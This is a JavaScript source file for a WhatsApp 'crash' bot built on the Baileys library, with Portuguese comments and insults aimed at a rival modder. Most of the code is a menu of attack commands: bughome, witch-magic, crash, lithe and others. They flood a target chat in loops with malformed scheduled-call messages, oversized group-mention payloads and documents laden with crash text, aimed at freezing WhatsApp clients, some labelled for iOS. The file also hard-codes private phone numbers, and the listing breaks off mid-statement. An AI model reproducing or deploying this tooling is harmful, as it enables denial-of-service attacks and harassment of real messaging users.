/*


ꜱᴀᴍɪᴅᴜ:

> 𝖈 𝖍 𝖆 𝖙 
@SamiduCybershield


BASE BOT && BOT TRAVAS. BAILEYS ATUALIZADO.

 <> <> <> ᴅᴀʀᴋ ᴇʀʀᴏʀ M o d s  <> <> <>

 SAI DAQUI VENOM MODS ,TU VENDE BAGULHO Q QUALQUER UM FAZ...

 BOT DE BAN NEM FUNCIONA (por enquanto).

---> VENOM MODS VEiO AQ PRA PEGAR CARACTERE E CASE PQ N SABE FAZER  <---




<> <> <> M e n s a g e m *  P a r a * V e n o m  M o d s  <> <> <>

bruxelas ant venom mods <>
bruxelas ant venom mods <>
bruxelas ant venom mods <>
bruxelas ant venom mods <>
bruxelas ant venom mods <>
bruxelas ant venom mods <>
bruxelas ant venom mods <>
bruxelas ant venom mods <>
bruxelas ant venom mods <>
bruxelas ant venom mods <>
bruxelas ant venom mods <>
bruxelas ant venom mods <>
bruxelas ant venom mods <>

*/


require('./config')
const { WA_DEFAULT_EPHEMERAL,PHONENUMBER_MCC,makeCacheableSignalKeyStore, makeWASocket,fetchLatestBaileysVersion,getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType } = require("@whiskeysockets/baileys")
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
readline = require('readline')
const pino = require('pino'),
Pino = require('pino'),
CFonts = require('cfonts'),
{ say } = CFonts,
spin = require('spinnies')
const moment = require('moment-timezone')
const { color, bgcolor } = require('./lib/color')
const { exec, spawn, execSync } = require("child_process")
const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./lib/myfunc')
const speed = require('performance-now')

const colors = require("colors")
const thumb = fs.readFileSync ('./lib/phonk.jpg')
travaSend = global.travaSend
//=================================================//
module.exports = conn = async (conn, m, chatUpdate, store) => {
bruxin = conn
 try {
var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype === 'messageContextInfo') ? (m.text) : ''
var budy = (typeof m.text == 'string' ? m.text : '')
var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
const info = mek;
//=================================================//
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()//Kalau mau Single prefix Lu ganti pake ini = const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const text = args.join(" ")
const q = args.join(" ")
const {quotedMsg, mentioned, now, fromMe } = m
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const from = mek.key.remoteJid

const isGroup = from.endsWith('@g.us');
const isBot = info.key.fromMe ? true : false;
const sender = mek.isGroup ? (mek.key.participant ? mek.key.participant : mek.participant) : mek.key.remoteJid
const userList = [
'5512981791389@s.whatsapp.net',
'556791420945@s.whatsapp.net',
'5599935009504@s.whatsapp.net',
'4917397773777@s.whatsapp.net',
'5512981966384@s.whatsapp.net',
'5555935051878@s.whatsapp.net',
'5575935058172@s.whatsapp.net',
'559991791193@s.whatsapp.net',
'5512981692700@s.whatsapp.net',
'5512988551376@s.whatsapp.net',
'553498650959@s.whatsapp.net',
'5512981689931@s.whatsapp.net',
'5512997675520@s.whatsapp.net',
'5512981785061@s.whatsapp.net'] // bruxelas ant venom mods <>
const isCreator = buuu = userList.includes(sender);
const groupMetadata = m.isGroup ? await bruxin.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : '' // bruxelas ant venom mods <>
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(isBot) : false // bruxelas ant venom mods <>
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false // bruxelas ant venom mods <>
const content = JSON.stringify(m.message)
const numberQuery = text.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net"
const mentionByTag = m.mtype == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
const Input = mentionByTag[0] ? mentionByTag[0] : q ? numberQuery : false
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const qtod = m.quoted? "true":"false"

const PrecisaSerAdm = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const PrecisaSerMembro = m.isGroup ? await participants.filter(v => v.admin === null).map(v => v.id) : [];
const participantes = m.isGroup ? await groupMetadata.participants : ''
efeitozin = '```'
bximg = {
espera: efeitozin + 'Aguarde já estou enviando . . .' + efeitozin,
adeemi: efeitozin + 'Apenas adm pode mano . . .'+ efeitozin,
gepe: efeitozin + 'Apenas em grupo mano . . .' + efeitozin,
base: efeitozin + 'Enviando base . . .' + efeitozin
}
 // bx ant venom mods <>
const { travadoc } = require('./database/virtex/travadoc.js');
const { bugchat } = require('./database/virtex/bugchat.js')
const { Ineffable } = require('./database/virtex/Ineffable.js')
const { Lithe } = require('./database/virtex/Lithe.js')
const telapreta = `${travadoc}`
const lagall = fs.readFileSync(`${__dirname}/database/Travas/name.ext.png`);
 // bruxelas ant venom mods <>
//=================================================
const { upload2 } = require("./lib/funções.js")
const getFileBuffer = async (mediakey, MediaType) => { 
const stream = await downloadContentFromMessage(mediakey, MediaType)

let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])
}
return buffer
}

const reply = (teks) => {
return bruxin.sendMessage(from, { text: teks, contextInfo:{"externalAdReply": {"title": `DEVELOPER BRUXO`,"body": ``, "previewType": "PHOTO","thumbnailUrl": 'https://telegra.ph/file/85271c26b8bfaa7e4c4e1.jpg',"sourceUrl": `https://youtube.com/@srbruxomp5`}}}, { quoted:m})} 
 // bruxeeeelas ant venom modsyyyy <>
const enviar = (texto) => {
bruxin.sendMessage(from, { text: texto, mentions: [sender]}, {quoted: info }).catch(e => {
return reply("Erro..");
})
}

const enviarJson = (texto) => {
bruxin.sendMessage(from, { text: JSON.stringify(texto, null, 4)}, {quoted: info }).catch(e => {
return reply("Erro..");
})
}

const hora = moment.tz('America/Sao_Paulo').format('HH:mm:ss');
const data = moment.tz('America/Sao_Paulo').format('DD/MM/YY');
const mx = fs.readFileSync('./from.js', 'utf-8');
const bxmidia = "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"
 // bruxelas ant venom mods <>
//========= TEMP BAN ===========//
const numberss = []; // Certifique-se de inicializar a variável numbers corretamente
const numbersFile = "./numbers.json";
prompt = require('prompt-sync')();
gradient = require('gradient-string');
const { default: makeWaSocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');
const { state, saveCreds } = await useMultiFileAuthState('.mm')
const spam = makeWaSocket({
auth: state,
mobile: true,
logger: pino({ level: 'silent' })
})
 // bruxelas ant venom mods <>
const fuckBeta = {
"key": { 
"fromMe": false,
"participant": '0@s.whatsapp.net',
"remoteJid": 'status@broadcast' 
},
message: {
"listResponseMessage": {
title: 'foi o bruxoKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKkk'
}}
}
 // bruxelas ant venom mods <>
/*console.log('enviando trava')
await conn.relayMessage('5547996988324@s.whatsapp.net',{ 
"paymentInviteMessage": {
serviceType: "UPI",
expiryTimestamp: Date.now() + (24 * 60 * 60 * 1000) // Exemplo de expiração em 24 horas
}},{})*/ 

const jidess = JSON.parse(fs.readFileSync('./lib/jids.json'))
 // bruxelas ant venom mods <>

async function bughome(nick,chat) {
try {datetime = Date.now() + 86400000;
voiceeee = 'VOICE';
texiste = nick+ travadoc + travadoc;
madybug = { scheduledTimestampMs: datetime,
callType: voiceeee,
title: texiste};
callcriada = { scheduledCallCreationMessage: madybug };
bruxinxelbug = generateWAMessageFromContent(chat,proto.Message.fromObject(callcriada),{userJid: from, quoted: info});
await conn.relayMessage(chat, bruxinxelbug.message, { messageId: bruxinxelbug.key.id }, 1000);
} catch (e){
console.log(e)
}
}
 // bruxelas ant venom mods <>
async function enviarCrash(nick,chat) {
conn.sendMessage(chat, {
document: {url: './config.js'},
mimetype: `image/null`,
fileName: `${nick}.${Lithe}` ,
caption: `${nick + Lithe}`,
}, {quoted: fuckBeta })
}

async function witchMagic() {
cu = "ㅤㅤㅤby bruxoㅤㅤ:cㅤㅤㅤ\n\n\n";
for (let i = 0; i < 300000; i++) {
cu += "aaa"}cu += "";
var extended = generateWAMessageFromContent(from, proto.Message.fromObject({groupMentionedMessage: {message: {extendedTextMessage: {text: " @120363161387074144@g.us",previewType: "NONE",contextInfo: {groupMentions: [{groupJid: "120363161387074144@g.us",groupSubject: cu}]}}}}}), { userJid: from, quoted: info })
await conn.relayMessage(from, extended.message, { messageId: extended.key.id })
}

//=================================================
/*let reactionMessage = {
react: {
text: `👁️‍🗨️`,
key: { remoteJid: m.chat, fromMe: true, id: mek.key.id }
}
}
await sleep(1500)
bruxin.sendMessage(m.chat, reactionMessage)*/
//=================================================//
if (!bruxin.public) {
if (!m.key.fromMe) return
}



let rn = ['recording']
let jd = rn[Math.floor(Math.random() * rn.length)];
if (m.message) { // bx né vida <>
console.log(isGroup ? `
╭──────────────────────────────────
│ 
│〔 ${colors.brightYellow("GRUPO")} 〕: 〔 ${chalk.green(groupName)} 〕 
│ 
│〔 ${colors.brightRed("MENSAGEM")} 〕: ${chalk.green(body.length > 500 ? '' : body)}
│〔 ${colors.brightRed("NiCK")} 〕: ${chalk.green(pushname)} 
│〔 ${colors.brightRed("HORA")} 〕: ${chalk.green(hora)} 
│〔 ${colors.brightRed("D4ТA")} 〕: ${chalk.green(data)} 
│〔 ${colors.brightRed("TiPO")} 〕: ${chalk.green(m.mtype)}
╰─────────────────────────────────` : `
╭────────────────────────────────── 
│ 
│〔 ${colors.brightYellow("PRIVADO")} 〕 : ${from} 
│
│〔 ${colors.brightRed("MENSAGEM")} 〕: ${chalk.green(body.length > 500 ? '' : body)}
│〔 ${colors.brightRed("NiCK")} 〕: ${chalk.green(pushname)} 
│〔 ${colors.brightRed("HORA")} 〕: ${chalk.green(hora)} 
│〔 ${colors.brightRed("D4ТA")} 〕: ${chalk.green(data)} 
│〔 ${colors.brightRed("TiPO")} 〕: ${chalk.green(m.mtype)} 
│
╰─────────────────────────────────`);
}
 // bx né vida <>
console.log('CHAT: ' + from);
console.log('DE: ' + sender + '\n');

 // bx né vida <>
//=================================================//
switch(command) {
/////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////

case 'menu':
if (!isBot && !isCreator) return
timestamp = speed()
latensi = speed() - timestamp
neww = performance.now()
oldd = performance.now()
uptime = process.uptime()
conn.sendMessage(from,{
text: `╭⪫═════════════════════════⪫
│
│ 🫅 *ɴᴀᴍᴇ:* ${pushname}
│ ⏱️ *𝖧𝗈𝗋𝖺:* ${hora}
│ 📅 *ᴛɪᴍᴇ:* ${data}
│ 🚀 *𝖵𝖾𝗅𝗈𝖼𝗂𝖽𝖺𝖽𝖾:* ${latensi.toFixed(4)}
│ 💨 *𝖳𝖾𝗆𝗉𝗈-𝖠𝗍𝗂𝗏𝗈:* ${runtime(process.uptime())}
│ ✔️ *𝖲𝗎𝗉𝗈𝗋𝗍𝖾:* wa.me/94759470750
│
╰═════════════════════════╯
╭───────────────────
│
│
│ < [ ᴄʀᴀꜱʜ ᴍᴇɴᴜ ] >
│
┃ ∠ ℑ ${prefix}bughome (😡)
┃ ∠ ℑ ${prefix}witch-magic (👹)
┃ ∠ ℑ ${prefix}bugchat (👅)
┃ ∠ ℑ ${prefix}crash (😈)
┃ ∠ ℑ ${prefix}serv-bug (👹
┃ ∠ ℑ ${prefix}apple.com (crash home ios)
┃ ∠ ℑ ${prefix}google.com (crash ios com LiNK)
┃ ∠ ℑ ${prefix}lithe (crash ios com DOCUMENT)
┃ ∠ ℑ ${prefix}a (crash ios com QUOTED)
┃ ∠ ℑ ${prefix}🌛
┃ ∠ ℑ ${prefix}lol-p (clearchat)
┃ ∠ ℑ ${prefix}all (ꜱᴀᴍᴜᴅᴜ)
│
│
╰───────────────────`,
contextInfo: {
externalAdReply: {
renderLargerThumbnail: true,
mediaType: 1,
title: `Hello: ` + pushname,
body: `###############################`,
thumbnail: await getBuffer('https://telegra.ph/file/df6e93b1bf1d1966e1bde.jpg),
jpegThumbnail: await getBuffer('https://telegra.ph/file/df6e93b1bf1d1966e1bde.jpg'),
previewType: "NONE",
sourceUrl: 'https://t.me/+7xDj7yxC-30zOGY9',
}}
})
break;
 // bx né vida <>
/////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////

case 'lol-p':
if (!isBot && !isCreator) return
enviar('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n')
break;

case 'google.com':
if (!isBot && !isCreator) return
for (let i = 0; i < travaSend; i++) {
conn.sendMessage(from,{
text: `https://google.com`,
contextInfo: {
externalAdReply: {
renderLargerThumbnail: true,
mediaType: 1,
title: Ineffable,
body: `###############################`,
thumbnail: await getBuffer('https://logopng.com.br/logos/google-37.svg'),
jpegThumbnail: await getBuffer('https://logopng.com.br/logos/google-37.svg'),
previewType: "NONE",
sourceUrl: 'https://t.me/+7xDj7yxC-30zOGY9',
}}
})
}
break;

case 'lithe':
if (!isBot && !isCreator) return
for (let i = 0; i < travaSend; i++) {
conn.sendMessage(from,{
document: fs.readFileSync(`./config.js`),
name: 'L i - t h e | iOS.deb',
fileName: 'L i - t h e | iOS.deb',
caption: 'L i - t h e | iOS.deb',
contextInfo: {
externalAdReply: {
renderLargerThumbnail: true,
mediaType: 1,
title: Lithe,
body: `###############################`,
thumbnail: await getBuffer('https://logopng.com.br/logos/google-37.svg'),
jpegThumbnail: await getBuffer('https://logopng.com.br/logos/google-37.svg'),
previewType: "NONE",
sourceUrl: 'https://t.me/+7xDj7yxC-30zOGY9',
}}
})
}
break;

case 'a':
if (!isBot && !isCreator) return 
for (let i = 0; i < travaSend; i++) {
conn.relayMessage(from,{
extendedTextMessage:{
"text":'.',
"contextInfo": {
"stanzaId": info.chat,
"participant": info.chat,
"quotedMessage": {
"conversation": Lithe
},
"disappearingMode": {
